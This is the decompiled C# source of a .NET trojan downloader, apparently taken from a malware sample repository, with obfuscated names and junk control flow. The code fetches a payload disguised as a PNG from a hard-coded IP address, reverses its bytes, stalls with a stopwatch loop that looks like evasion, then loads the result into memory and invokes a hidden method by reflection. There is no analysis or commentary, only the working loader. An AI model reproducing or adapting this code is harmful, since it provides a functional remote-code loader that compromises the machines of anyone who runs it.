// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Ainxpfgc, Version=8.0.2.3, Culture=neutral, PublicKeyToken=null
// MVID: 08567EA8-5FE0-44F1-9484-66E2042BCAB6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Downloader.MSIL.Wagex.gen-303bac353481639b2ead5860845f621f9f70a8282e31ecd3cb5c5d3fafaeb38d.exe

using \u0001;
using \u0002;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0002
{
  internal class \u0003
  {
    static \u0002.\u0001 \u0001([In] \u0003 obj0)
    {
      \u0002.\u0001 obj1;
      AppDomain domain;
      int num;
      if (true)
      {
        if (true)
        {
          if (true)
          {
            obj1 = new \u0002.\u0001();
            domain = Thread.GetDomain();
            num = domain.BaseDirectory == domain.BaseDirectory ? 1 : 0;
          }
          else
            goto label_7;
        }
        else
          goto label_6;
      }
      else
        goto label_4;
label_3:
      bool flag = num != 0;
label_4:
      num = flag ? 1 : 0;
      if (true)
      {
        if (num == 0)
          goto label_9;
      }
      else
        goto label_3;
label_6:
      \u0001.\u0002 obj2 = new \u0001.\u0002();
label_7:
      if (true)
        obj1.\u0001 = domain.Load(\u0003.\u0001(obj2));
      else
        goto label_10;
label_9:
      \u0002.\u0001 obj3 = obj1;
label_10:
      return obj3;
    }

    static byte[] \u0001(\u0001.\u0002 _param0, [In] string obj1)
    {
      MemoryStream destination = new MemoryStream();
      try
      {
        while (true)
        {
          if (true)
          {
            WebRequest.Create(obj1).GetResponse().GetResponseStream().CopyTo((Stream) destination);
            break;
          }
        }
        do
          ;
        while (false);
        return destination.ToArray();
      }
      finally
      {
label_6:
        if (destination != null)
          destination.Dispose();
        else
          goto label_9;
label_8:
        if (false)
          goto label_6;
label_9:
        if (false)
          goto label_8;
      }
    }

    static string \u0001(\u0002.\u0001 _param0, [In] \u0003 obj1)
    {
      if (true)
        goto label_9;
label_1:
      Type type;
      while (true)
      {
        int num;
        if (type.IsGenericType)
          num = 1;
        else
          goto label_11;
label_3:
        if (true)
          goto label_12;
label_4:
        bool flag;
        if (true)
        {
          if (true)
          {
            if (flag)
            {
              if (true)
                return (string) type.InvokeMember("Jmtdpynycnphjnbnnv", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
              continue;
            }
            break;
          }
          goto label_11;
        }
        else
          break;
label_12:
        flag = num != 0;
        goto label_4;
label_11:
        num = !type.IsGenericTypeDefinition ? 1 : 0;
        goto label_3;
      }
      throw new Exception();
label_9:
      type = _param0.\u0001.GetType("Emfwkhzgcpxn.Ytfabdwtet");
      goto label_1;
    }

    static byte[] \u0001([In] \u0001.\u0002 obj0)
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
        if (false)
          ;
      }
      byte[] numArray1 = \u0003.\u0001(obj0, "http://179.43.175.187/ymzs/Ainxpfgc_Wzcbdqui.png");
      List<byte> byteList = new List<byte>();
      int length1 = numArray1.Length;
      while (true)
      {
        if (length1-- > 0)
          goto label_21;
        else
          goto label_6;
label_3:
label_4:
        continue;
label_6:
        Stopwatch stopwatch = new Stopwatch();
        if (true)
          stopwatch.Start();
        else
          goto label_9;
label_8:
label_9:
        byte[] numArray2 = new byte[numArray1.Length];
        int index = 0;
        if (true)
        {
label_15:
          bool flag = index < numArray1.Length;
          while (flag)
          {
            int length2 = numArray1.Length;
            if (true)
            {
              while (true)
              {
                if (length2-- > 0)
                {
                  numArray2[index] = numArray1[length2];
                  if (stopwatch.Elapsed.TotalSeconds <= 20.0)
                    continue;
                }
                ++index;
                goto label_15;
              }
              goto label_3;
            }
          }
          stopwatch.Stop();
          if (true)
          {
            GC.Collect();
            if (false)
              goto label_4;
            else
              break;
          }
          else
            goto label_8;
        }
label_21:
        byteList.Add(numArray1[length1]);
        goto label_3;
      }
      return byteList.ToArray();
    }
  }
}
